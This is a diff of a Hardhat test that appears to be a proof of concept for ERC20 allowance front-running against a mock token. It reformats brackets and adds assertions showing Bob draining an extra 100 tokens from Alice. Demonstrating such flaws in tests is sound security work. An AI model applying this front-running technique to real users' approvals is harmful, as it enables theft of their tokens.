@@ -37,7 +37,7 @@ describe("PoC: ERC20 Allowance Front-Running", function () {
         let pendingBlock = await network.provider.send("eth_getBlockByNumber", [
             "pending",
             false,
-          ]);
+        ]);
         console.log("Pending block transactions: ", pendingBlock);
 
         // Mine the block manually to simulate validator behavior, transaction with the more profitable gas amount will be choosen by the validator
@@ -47,7 +47,7 @@ describe("PoC: ERC20 Allowance Front-Running", function () {
         pendingBlock = await network.provider.send("eth_getBlockByNumber", [
             "pending",
             false,
-          ]);
+        ]);
         console.log("Pending block transactions: ", pendingBlock);
 
         // Re-enable auto mining for future tests
@@ -62,6 +62,10 @@ describe("PoC: ERC20 Allowance Front-Running", function () {
 
         // Bob takes the last 100 tokens
         await mockToken.connect(bob).transferFrom(alice.address, bob.address, ethers.parseUnits("100", 18));
+
+        // Check balances again
+        expect(await mockToken.balanceOf(bob.address)).to.equal(ethers.parseUnits("1100", 18)); // Bob got the additional 100 tokens
+        expect(await mockToken.balanceOf(alice.address)).to.equal(ethers.parseUnits("3900", 18)); // Alice is now down another 100 tokens
     });
 
     it("Should allow Bob to front-run Alice's allowance increase and get extra allowance", async function () {
